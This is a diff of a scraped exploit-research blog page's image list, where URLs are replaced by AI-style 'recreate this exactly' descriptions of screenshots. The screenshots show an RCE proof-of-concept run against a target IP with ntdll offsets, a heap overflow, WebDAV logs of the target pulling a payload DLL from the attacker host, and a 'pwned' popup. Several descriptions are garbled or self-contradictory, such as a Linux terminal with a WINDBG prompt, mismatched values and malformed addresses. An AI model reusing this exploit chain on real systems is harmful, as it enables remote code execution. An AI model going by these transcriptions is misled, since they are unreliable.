@@ -1034,25 +1034,441 @@ Bill Demirkapi's Blog © 2026
 Powered by Ghost
 
 IMAGES
-https://billdemirkapi.me/content/images/size/w100/2021/02/lrVO7WoC_400x400-1.jpg
+
 https://billdemirkapi.me/content/images/size/w2000/2023/01/eop2_header.png
 https://i.imgur.com/qO3h4xa.png
-https://i.imgur.com/bDjtjHo.png
+[IMAGE DESCRIPTION: Based on the visual evidence, this is a screenshot of a disassembler window (likely IDA Pro) showing x64 assembly code for a function named `GetString`.
+
+To recreate this exactly, you would need to set up a C++ project compiled for x64 with security cookies enabled (/GS), and then view the disassembly.
+
+Here is the exact text and structure of the image, line by line:
+
+**Header Section:**
+```text
+.text:00000001400010D0 ; void GetString(void)
+.text:00000001400010D0                 ; CODE XREF: main::loc_140001141↑p
+.text:00000001400010D0                 ; DATA XREF: .pdata:00000001400290C0↓o ...
+.text:00000001400010D0
+.text:00000001400010D0 tempBuffer      = byte ptr -28h
+.text:00000001400010D0 var_18          = qword ptr -18h
+.text:00000001400010D0
+.text:00000001400010D0 ; __unwind { // GSHandlerCheck
+.text:00000001400010D0                 sub     rsp, 48h
+.text:00000001400010D4                 mov     rax, cs:__security_cookie
+.text:00000001400010DB                 xor     rax, rsp
+.text:00000001400010DE                 mov     [rsp+48h+var_18], rax
+.text:00000001400010E3                 lea     rdx, [rsp+48h+tempBuffer]
+.text:00000001400010E8                 lea     rcx, ??_7type_info@@6B@+8 ; _Format
+.text:00000001400010EF                 call    scanf
+.text:00000001400010F4                 lea     rax, [rsp+48h+tempBuffer]
+.text:00000001400010F9                 call    printf
+.text:00000001400010FE                 mov     rcx, [rsp+48h+var_18]
+.text:0000000140001103                 xor     rcx, rsi
+.text:0000000140001106                 call    __security_check_cookie
+.text:000000014000110B                 add     rsp, 48h
+.text:000000014000110F                 retn
+.text:000000014000110F ; } // starts at 1400010D0
+.text:000000014000110F
+.text:000000014000110F ?GetString@@YAXXXZ endp
+```
+
+**Visual Formatting Details:**
+*   **Font:** Monospace (likely Consolas or Lucida Console).
+*   **Colors:**
+    *   **Blue:** Assembly mnemonics (`sub`, `mov`, `lea`, `call`, `xor`, `add`, `retn`) and register names (`rsp`, `rax`, `rcx`, `rdx`).
+    *   **Dark Blue/Black:** Addresses (e.g., `.text:00000001400010D0`) and variable names (`tempBuffer`, `var_18`).
+    *   **Green:** Comments (starting with `;`).
+    *   **Red Box:** A red rectangle highlights the text `GSHandlerCheck` in the comment line.
+*   **Layout:** The code is indented. The addresses are in the left column, instructions in the middle, and comments on the right.
+
+**Key Technical Details for Recreation:**
+1.  **Compiler:** Microsoft Visual C++ (MSVC).
+2.  **Architecture:** x64.
+3.  **Function Name:** `GetString` (C++ mangled name `?GetString@@YAXXXZ`).
+4.  **Security Feature:** The code implements a Stack Security Cookie (GS) check.
+    *   It saves a cookie XORed with the stack pointer (`rsp`) at the start.
+    *   It calls `scanf` (vulnerable function).
+    *   It calls `printf`.
+    *   It verifies the cookie before returning.
+5.  **Specific Oddity:** The instruction at `1103` is `xor rcx, rsi`. This is slightly unusual for a standard GS check (which typically XORs with `rsp` again), but `rsi` is preserved across function calls in the x64 calling convention, so if `rsp` wasn't saved, the compiler might be using a saved register or there is a specific optimization/quirk here. (Actually, looking closely, it is `xor rcx, rsi`, which implies `rsi` held the original `rsp` value or a similar anchor, though standard MSVC usually uses `xor rcx, [rsp+...]` or similar. I will transcribe it exactly as `xor rcx, rsi` based on the image).
+
+**The Red Box:**
+There is a red rectangular outline around the text `GSHandlerCheck` on the line `; __unwind { // GSHandlerCheck`.]
 https://i.imgur.com/n8RoTU5.png
-https://i.imgur.com/WgORSPV.png
+[IMAGE DESCRIPTION: This is a screenshot of a code editor (likely Visual Studio) displaying a snippet of C or C++ code involving low-level memory manipulation, specifically related to stack unwinding or context switching in a Windows environment.
+
+Here is the exact text and formatting details required to recreate it:
+
+**Visual Style:**
+*   **Background:** White.
+*   **Font:** Monospaced (likely Consolas).
+*   **Line Numbers:** Gray text on the far left (245, 246, 247, 248).
+*   **Syntax Highlighting:**
+    *   **Blue:** Keywords, types (`unsigned`, `__int64`), and variables (`Rsp`, `Context`, `Rip`).
+    *   **Black:** Operators (`=`, `->`, `*`, `+`), function names (`RtlpPopUserShadowStack`), and numbers.
+    *   **Green:** Comments (`// ...`).
+
+**Exact Code Content:**
+
+**Line 245:**
+`Rsp = (unsigned __int64 *)Context->Rsp;`
+
+**Line 246:**
+`Context->Rip = *Rsp; // Update Rip to the return address from stack`
+
+**Line 247:**
+`Context->Rsp = (unsigned __int64)(Rsp + 1); // Rsp += 8 to account for the return address being read`
+
+**Line 248:**
+`RtlpPopUserShadowStack((__int64)Context); // Remove a return address from the shadow stack`
+
+***
+
+**Technical Context for Recreating the Logic:**
+If you are trying to understand *what* this code does to recreate the logic elsewhere:
+1.  **Line 245:** It takes the `Rsp` (Stack Pointer) value from a `Context` structure, casts it to an unsigned 64-bit integer pointer, and assigns it to a local variable named `Rsp`.
+2.  **Line 246:** It dereferences that pointer (`*Rsp`) to get the return address stored at that memory location and assigns it to `Context->Rip` (Instruction Pointer), effectively restoring where the program should return to.
+3.  **Line 247:** It increments the `Rsp` pointer by 1 (which, because it is cast to a 64-bit pointer, adds 8 bytes to the address). This moves the stack pointer past the return address it just read.
+4.  **Line 248:** It calls a Windows kernel function `RtlpPopUserShadowStack` to remove the corresponding return address from the hardware-enforced shadow stack (a security feature).]
 https://i.imgur.com/eGGwsH6.png
-https://i.imgur.com/Xh9tDLX.png
+[IMAGE DESCRIPTION: This is a screenshot of decompiled C-like pseudocode, likely from the **Hex-Rays Decompiler** plugin within **IDA Pro** (Interactive Disassembler). It shows the internal logic of a Windows system function responsible for loading the WOW64 (Windows 32-bit on Windows 64-bit) subsystem.
+
+To recreate this exactly, you would need a code editor or decompiler window with the following specific content and visual style:
+
+### Visual Style
+*   **Font:** A monospaced font (like Consolas or Lucida Console).
+*   **Background:** White.
+*   **Line Numbers:** Blue numbers on the far left (1 through 26).
+*   **Syntax Highlighting:**
+    *   **Keywords/Types:** Dark blue (e.g., `int64`, `const`, `void`, `char`).
+    *   **Variables:** Black.
+    *   **Comments:** Grey (on the right side of variable declarations).
+    *   **Strings:** Black (inside quotes).
+    *   **Hex Numbers:** Black.
+
+### The Code Content
+
+**Function Signature:**
+```c
+__int64 __fastcall LdrpLoadWow64(const UNICODE_STRING *Directory)
+```
+
+**Variable Declarations (Lines 3-16):**
+The code lists local variables with comments indicating their register or stack location.
+*   `NTSTATUS status; // ebx`
+*   `unsigned int v2; // ebx`
+*   `void **v3; // rdi`
+*   `__int64 v6; // cl`
+*   `char v7; // al`
+*   `NTSTATUS v8; // [rsp+38h] [rbp-D0h]`
+*   `int v9; // [rsp+40h] [rbp-C8h]`
+*   `UNICODE_STRING InternalPath; // [rsp+40h] [rbp-C0h] BYREF`
+*   `__int64 v11; // [rsp+58h] [rbp-B0h] BYREF`
+*   `__int64 unk[15]; // [rsp+68h] [rbp-A0h] BYREF`
+*   `char v13; // [rsp+E4h] [rbp-24h]`
+*   `WCHAR internalBuffer[255]; // [rsp+E8h] [rbp-20h] BYREF`
+*   `__int64 retaddr; // [rsp+320h] [rbp+218h]`
+
+**Code Logic (Lines 18-26):**
+```c
+*(DWORD *)&InternalPath.Length = 0x2080000;
+InternalPath.Buffer = internalBuffer;
+RtlAppendUnicodeStringToString(&InternalPath, Directory);
+RtlAppendUnicodeToString(&InternalPath, L"wow64.dll");
+LdrInitializeDllPath((__int64)&InternalPath.Buffer, 0x400164, unk);
+status = LdrpLoadDll(&InternalPath, unk, 0x800, &v11);
+(v13
+RtlReleasePath(unk);
+if (status < 0)
+```
+
+*(Note: Line 24 is cut off in the screenshot, showing only `(v13` before the end of the visible area.)*
+
+### Key Details for Exact Recreation
+If you are typing this out to match the image:
+1.  **Indentation:** The code block (lines 18-26) is indented to the right.
+2.  **Comments:** The comments on lines 3-16 (like `// ebx` and `[rsp+38h]`) are crucial. They represent the internal mapping of the decompiler to the original assembly stack frame.
+3.  **Specific Hex Values:**
+    *   Line 18: `0x2080000`
+    *   Line 22: `0x400164`
+    *   Line 23: `0x800`
+4.  **Specific Strings:** The string literal on line 21 is `L"wow64.dll"`.]
 https://i.imgur.com/4VHldOn.png
-https://i.imgur.com/CoorhBH.png
+[IMAGE DESCRIPTION: To recreate this image exactly, you would need a Linux terminal (likely Ubuntu, given the purple background) and a Python script named `exploit.py` running with root privileges.
+
+Here is the detailed breakdown of the content, formatting, and command used:
+
+### 1. The Environment
+*   **Background Color:** Dark Purple (Hex approx `#300A24`).
+*   **Font:** Monospace (likely DejaVu Sans Mono or Ubuntu Mono).
+*   **User/Host:** The prompt indicates you are logged in as `root` on a machine named `test-Virtual-Machine`.
+
+### 2. The Command Line (Top Line)
+At the very top, the command prompt and the executed command are:
+`root@test-Virtual-Machine:/home/test/EOP_PoC# python3 exploit.py 172.21.227.148 0x8B9D 0x93AA0 0x47E20 0x8998C`
+
+### 3. The Script Output (Line by Line)
+The script uses color coding to denote status:
+*   **`[-]`** is Light Blue (Info).
+*   **`[+]`** is Green (Success).
+*   **`WARNING`** is Red.
+*   **Standard text** is White/Grey.
+
+**The text output is exactly as follows:**
+
+```text
+[-] CollidedUnwind RCE PoC by @BillDemirkapi
+[-] Loaded the following arguments:
+[-] Target IP = 172.21.227.148
+[-] RtlpExecuteHandlerForUnwind Offset = 0xa8b9d
+[-] __C_specific_handler Offset = 0x93aa0
+[-] RtlInitUnicodeStringEx Offset = 0x47e20
+[-] LdrpLoadWow64 Offset = 0x8998c
+[-] Starting WebDAV server.
+WARNING:pywebdav:Authentication disabled!
+[-] Enter anything to trigger the exploit.Listening on 0.0.0.0 (80)
+
+[-] Enter anything to trigger the exploit.
+[+] Detected your local IP as 172.21.232.222. Note- target must be able to reach this IP.
+[+] Requesting a leak and heap allocation of 0x1bc bytes.
+[+] Leak and allocation successful! Details:
+[+] NtdllBaseAddress = 0x7ffe8afa0000
+[+] AllocatedHeapMemory = 0x2f17006be80
+[+] Finished generating the heap buffer. Copying to target.
+[+] Generated overflow buffer of size 0x48.
+[+] Triggering exploit, good luck!
+[-] Enter anything to exit.
+```
+
+### 4. Key Technical Details to Note
+If you are trying to recreate the *scenario* (not just the text), here are the specific technical values visible:
+*   **Target IP:** `172.21.227.148`
+*   **Attacker (Local) IP:** `172.21.232.222`
+*   **Heap Allocation Size:** `0x1bc` bytes
+*   **Overflow Buffer Size:** `0x48` bytes
+*   **Offsets:** The script uses specific offsets for Windows DLL functions (likely `ntdll.dll`), specifically `0xa8b9d` for `RtlpExecuteHandlerForUnwind`.]
 https://i.imgur.com/TpfsGVN.png
-https://i.imgur.com/gumgVGd.png
-https://i.imgur.com/rjKdwBo.png
+[IMAGE DESCRIPTION: This is a screenshot of a command-line debugger interface, likely running on a Linux terminal (given the prompt style and register names like `rax`, `rbx`), displaying the state of an x86_64 architecture process. The background is black, and the text is a standard terminal grey/white monospace font.
+
+Here is the breakdown of the content from top to bottom:
+
+**1. The Prompt**
+At the very top left, there is a command prompt:
+`WINDBG>rm 8002`
+
+**2. Register Dump**
+Below the prompt is a grid of CPU registers and their hexadecimal values. They are arranged in three columns (mostly):
+
+*   **Row 1:**
+    *   `rax=00000000deadbeef`
+    *   `rbx=000001fc7d9d7220`
+    *   `rcx=00000096e26ff330`
+*   **Row 2:**
+    *   `rdx=000001fc7d9ea4f8`
+    *   `rsi=0000000000000000`
+    *   `rdi=000001fc7d9dd440`
+*   **Row 3:**
+    *   `rip=00007f7cb8a1152`
+    *   `rsp=00000096e26ff2c0`
+    *   `rbp=000001fc7d9dd440`
+*   **Row 4:**
+    *   `r8=0000000000000048`
+    *   `r9=0000000000000060`
+    *   `r10=00007f77cbbaa000`
+*   **Row 5:**
+    *   `r11=00007f7cb8a2b43`
+    *   `r12=0000000000000000`
+    *   `r13=0000000000000000`
+*   **Row 6:**
+    *   `r14=0000000000000000`
+    *   `r15=0000000000000000`
+*   **Row 7 (Flags):**
+    *   `eflags=0000000000000000 nv up ei pl nz na pe nc`
+
+**3. The Highlighted Section**
+There is a blue rectangular highlight covering the segment registers on the line below the flags. The text inside the highlight is white.
+*   `ss=00000096e27ffdf8`
+*   `ds=0000000000000001`
+*(Note: To the left of `ss`, outside the highlight, is `cs=0033`)*
+
+**4. Disassembly / Memory View**
+At the bottom, there is information about the currently executing code and memory:
+
+*   **Function Context:**
+    `Vulnerable_App.exe!ProcessPacket+0x15c2:`
+*   **Instruction:**
+    `00007f77cb8a1152 c700bebafeef mov    dword ptr [rax],0CAFEBAFE`
+    *(This indicates the instruction pointer is at `00007f77cb8a1152`, executing a `mov` instruction that tries to write the value `0xCAFEBABE` to the memory address stored in `rax`)*
+*   **Memory Dump:**
+    `ds:00000000 deadbeef=????????`
+    *(This shows the debugger is attempting to read from the data segment at address 0, and specifically looking at the address `deadbeef`, but the value is unreadable or invalid, represented by question marks).*]
+[IMAGE DESCRIPTION: To recreate this exactly, you will need a text editor or an Integrated Development Environment (IDE) configured with a **dark theme** (specifically one that mimics the Visual Studio or VS Code "Dark" styles) and a **monospaced font** (such as Consolas or Courier New).
+
+### 1. The Code Content
+Copy the following code exactly, including the indentation and comments:
+
+```cpp
+int64 __fastcall RtlpUnwindHandler(
+    PEXCEPTION_RECORD ExceptionRecord,
+    __int64 EstablisherFrame,
+    PCONTEXT ContextRecord,
+    PDISPATCHER_CONTEXT DispatcherContext)
+{
+    PDISPATCHER_CONTEXT attackerDispatcherContext; // rax
+
+    // Retrieve saved DispatcherContext pointer from untrusted stack.
+    attackerDispatcherContext = *(PDISPATCHER_CONTEXT*)(EstablisherFrame + 0x20);
+    DispatcherContext->ControlPc = attackerDispatcherContext->ControlPc;
+    DispatcherContext->ImageBase = attackerDispatcherContext->ImageBase;
+    DispatcherContext->FunctionEntry = attackerDispatcherContext->FunctionEntry;
+    DispatcherContext->EstablisherFrame = attackerDispatcherContext->EstablisherFrame;
+    DispatcherContext->ContextRecord = attackerDispatcherContext->ContextRecord;
+    DispatcherContext->LanguageHandler = attackerDispatcherContext->LanguageHandler;
+    DispatcherContext->HandlerData = attackerDispatcherContext->HandlerData;
+    DispatcherContext->HistoryTable = attackerDispatcherContext->HistoryTable;
+    DispatcherContext->ScopeIndex = attackerDispatcherContext->ScopeIndex;
+    // Return ExceptionCollidedUnwind
+    return 3i64;
+}
+```
+
+### 2. Syntax Highlighting (Color Palette)
+To match the image, apply the following colors to the specific tokens:
+
+*   **Orange/Yellow (`#CE9178`):** Used for function names and specific keywords:
+    *   `__fastcall`, `RtlpUnwindHandler`, `PEXCEPTION_RECORD`, `__int64`, `PCONTEXT`, `PDISPATCHER_CONTEXT`.
+*   **Light Blue/Cyan (`#9CDCFE`):** Used for variable names and members:
+    *   `ExceptionRecord`, `EstablisherFrame`, `ContextRecord`, `DispatcherContext`, `attackerDispatcherContext`, `ControlPc`, `ImageBase`, `FunctionEntry`, `LanguageHandler`, `HandlerData`, `HistoryTable`, `ScopeIndex`.
+*   **Green (`#6A9955`):** Used for all comments:
+    *   `// rax`, `// Retrieve saved...`, `// Return ExceptionCollidedUnwind`.
+*   **White/Off-White (`#D4D4D4`):** Used for operators, punctuation, and standard types:
+    *   `int64`, `{ }`, `( )`, `*`, `=`, `->`, `+`, `return`, `;`.
+*   **Purple/Magenta (`#C586C0`):** Used for the return value numeric literal:
+    *   `3i64`.
+
+### 3. Visual Styling & Layout
+*   **Background Color:** Dark grey/charcoal (approx `#1E1E1E`).
+*   **Line Numbers:** Enable line numbering on the left margin. The lines are numbered 1 through 22.
+*   **Line Highlighting:** Apply a **deep red semi-transparent highlight** (approx `#632525`) to the background of **Line 10**:
+    *   `attackerDispatcherContext = *(PDISPATCHER_CONTEXT*)(EstablisherFrame + 0x20);`
+*   **Indentation:** Use 4 spaces per indentation level.
+*   **Alignment:**
+    *   Lines 2–5 are indented once.
+    *   Lines 7–21 are indented once inside the curly braces.
+
+### 4. Summary of Logic (for context)
+The code depicts a C-style function acting as an exception unwinding handler. It takes a pointer (`EstablisherFrame`), offsets it by `0x20` bytes, casts that memory location to a `PDISPATCHER_CONTEXT` pointer, and then manually copies every member of that "attacker-controlled" structure into the legitimate `DispatcherContext` structure, ending by returning the value `3`.]
 https://i.imgur.com/F6p1uMH.png
 https://i.imgur.com/w2GWmqG.png
 https://i.imgur.com/0pEkQvx.png
 https://i.imgur.com/pD3y8hH.png
-https://i.imgur.com/T5NxTMo.png
-https://i.imgur.com/VfcTqKn.png
+[IMAGE DESCRIPTION: To recreate this image exactly, you need to simulate a Linux terminal window (specifically resembling the default Ubuntu terminal) displaying a mix of exploit script output and web server access logs.
+
+Here are the precise details:
+
+### **Visual Style & Environment**
+*   **Window Type:** A standard terminal emulator window (like GNOME Terminal).
+*   **Background Color:** Deep dark purple (Hex: `#300A24`).
+*   **Font:** A standard monospace font (like "Ubuntu Mono" or "DejaVu Sans Mono"), white by default.
+*   **Text Alignment:** Left-aligned.
+
+### **Text Content (Line by Line)**
+
+**Line 1 (Bright Green Text):**
+`[+] Triggering exploit, good luck!`
+
+**Line 2 (Bright Green Text):**
+`[+] Enter anything to exit.`
+
+**Line 3 (White Text):**
+`172.21.227.148 - - [25/Jan/2023 20:09:28] "OPTIONS /wow64.dll HTTP/1.1" 200 -`
+
+**Line 4 (White Text):**
+`172.21.227.148 - - [25/Jan/2023 20:09:28] "PROPFIND /wow64.dll HTTP/1.1" 207 -`
+
+**Line 5 (White Text):**
+`172.21.227.148 - - [25/Jan/2023 20:09:28] "PROPFIND /wow64.dll HTTP/1.1" 207 -`
+
+**Line 6 (White Text):**
+`172.21.227.148 - - [25/Jan/2023 20:09:28] "GET /wow64.dll HTTP/1.1" 200 -`
+
+**Line 7 (White Text):**
+`172.21.227.148 - - [25/Jan/2023 20:09:28] "GET /wow64.dll HTTP/1.1" 200 -`
+
+**Line 8 (White Text):**
+`172.21.227.148 - - [25/Jan/2023 20:09:28] "PROPFIND /wow64.dll.2.Config HTTP/1.1" 404 -`
+
+### **Context for Recreation**
+If you are trying to generate this programmatically (e.g., in Python):
+1.  The first two lines are likely printed by a Python script using `print("\033[92m[+] Triggering exploit, good luck!\033[0m")` (using ANSI escape codes for green).
+2.  The subsequent lines look like output from a Python `http.server` or a tool like `msfvenom` / `Metasploit` running a local web server to host a payload (`wow64.dll`).
+3.  The HTTP status code `207` indicates the server is likely running with WebDAV enabled.]
+[IMAGE DESCRIPTION: To recreate this image exactly, you need to simulate a Windows application window running an executable that triggers a basic message box. Here is the detailed breakdown of the visual elements:
+
+### 1. The Main Application Window
+*   **Window Style:** A standard Windows 10/11 application window.
+*   **Title Bar:** 
+    *   **Text:** The title is a file path: `C:\Users\User\Desktop\poc\VulnerableApp.exe`
+    *   **Alignment:** Left-aligned.
+    *   **Controls:** Standard Windows minimize, maximize (disabled/grayed out), and close buttons on the right.
+*   **Background:** The main body of the application is a solid, flat black rectangle (`#000000`).
+*   **Dimensions:** A wide rectangular landscape orientation (approximately 16:9 aspect ratio).
+
+### 2. The Message Box (The Popup)
+*   **Position:** Centered exactly in the middle of the black background.
+*   **Appearance:** A classic Windows "Alert" or "Message Box" style.
+*   **Background Color:** Pure white.
+*   **Border:** A thin, light-gray border.
+*   **Title Bar:** 
+    *   **Text:** `whoops!` (all lowercase except for the exclamation point).
+    *   **Alignment:** Left-aligned.
+    *   **Controls:** A small "X" close button on the top right.
+*   **Content/Body:**
+    *   **Text:** `pwned` (all lowercase).
+    *   **Font:** Standard system sans-serif (like Segoe UI).
+    *   **Alignment:** Left-aligned, with a standard margin from the left edge.
+*   **The Button:**
+    *   **Label:** `OK` (all caps).
+    *   **Style:** A rectangular system button with a light-gray gradient and a thin dark-gray border.
+    *   **Position:** Centered horizontally at the bottom of the white box.
+
+### 3. Environmental Details
+*   **Operating System:** Windows 10 or 11.
+*   **Taskbar:** The bottom of the image shows a sliver of a blue-toned Windows wallpaper, indicating the window is not maximized to full screen.
+*   **Window State:** The window is floating on the desktop.
+
+### Technical Summary for Recreation:
+If you are coding this (e.g., in C# or Python), you would create a form with a black background, set its title to the specific file path, and call a `MessageBox.Show("pwned", "whoops!")` function to generate the popup.]
 https://billdemirkapi.me/content/images/size/w600/2024/09/blogpresentation_banner3.png
-https://billdemirkapi.me/content/images/size/w600/2022/04/sharing_is_caring.png
+[IMAGE DESCRIPTION: To recreate this image exactly, you will need to assemble two main layers: a background screenshot of a software interface and a foreground text overlay.
+
+Here is the detailed breakdown:
+
+### 1. The Background Layer
+The background is a screenshot of a Windows-based software application, likely a reverse engineering tool like IDA Pro or a PE (Portable Executable) header editor. It has been heavily blurred.
+
+*   **The Interface:** It is a standard grey Windows application window.
+*   **The Grid/Table:** The top portion shows a spreadsheet-style grid with column headers. Although blurred, you can distinguish headers that read: "Virtual Addr", "File Offset", "Size", "Type", "Virtual Size", and "Characteristics".
+*   **The Highlight:** One specific row in the middle of the table is highlighted in a light blue color (typical Windows selection color).
+*   **The Dialog Box:** Floating in the center of the screen is a smaller, rectangular dialog box or window. It appears to have input fields and checkboxes, typical of a "Section Properties" or "Segment" editor.
+*   **The Toolbar:** At the very bottom left, there is a row of small, colorful icons (blue and grey), likely a toolbar for the application.
+*   **The Effect:** Apply a strong **Gaussian Blur** (approx. radius 10-15 pixels) to this entire background image so that no text is legible, but the layout remains visible.
+
+### 2. The Text Overlay
+Centered perfectly over the blurred background is three lines of text in a standard sans-serif font (like Arial or Helvetica). The text is pure black (#000000).
+
+*   **Line 1:** "Sharing is Caring"
+    *   **Style:** Bold (or Extra Bold).
+    *   **Size:** This is the largest line of text.
+*   **Line 2:** "Abusing Shared Sections"
+    *   **Style:** Regular (or Thin).
+    *   **Size:** Smaller than the first line.
+*   **Line 3:** "for Code Injection"
+    *   **Style:** Regular (or Thin).
+    *   **Size:** Same size as the second line.
+
+### Summary of Layout
+*   **Alignment:** All text is horizontally centered.
+*   **Spacing:** There is moderate vertical spacing between the three lines of text to make them distinct.
+*   **Contrast:** The sharp, black text contrasts heavily against the soft, light grey/blue background.]
 https://billdemirkapi.me/content/images/size/w600/2022/02/exception_oriented_programming_part1.png
